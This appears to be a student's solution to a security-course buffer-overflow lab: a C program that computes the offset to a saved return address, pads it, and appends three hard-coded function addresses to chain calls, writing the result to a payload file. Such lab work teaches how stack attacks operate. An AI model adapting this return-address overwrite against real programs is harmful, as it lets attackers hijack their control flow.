#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
    long buffer_addr = 0xffffd053;
    long eip_addr = 0xffffd09c;
    int offset = eip_addr - buffer_addr;
    printf("Offset5: %d\n", offset);

    long round1_addr = 0x8049222;
    long round2_addr = 0x8049263;
    long round3_addr = 0x80492a4;

    char attack5_buffer[offset + 12]; // 3 rounds * 4 bytes each
    memset(attack5_buffer, '*', offset);

    memcpy(attack5_buffer + offset, &round1_addr, 4);
    memcpy(attack5_buffer + offset + 4, &round2_addr, 4);
    memcpy(attack5_buffer + offset + 8, &round3_addr, 4);

    write_to_file( "payloads/attack5-payload", attack5_buffer, sizeof(attack5_buffer), FILE_CLEAR );
    exit(0);
}